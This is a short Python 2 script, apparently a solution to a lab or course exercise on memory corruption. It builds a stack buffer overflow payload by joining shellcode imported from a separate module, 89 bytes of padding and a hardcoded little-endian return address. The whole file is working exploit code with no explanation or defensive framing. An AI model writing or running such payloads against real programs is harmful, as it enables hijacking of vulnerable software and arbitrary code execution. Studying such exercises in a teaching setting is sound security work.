from struct import pack
from shellcode import shellcode
print shellcode + '0'*89 + pack("<I", 0xbffe952c)
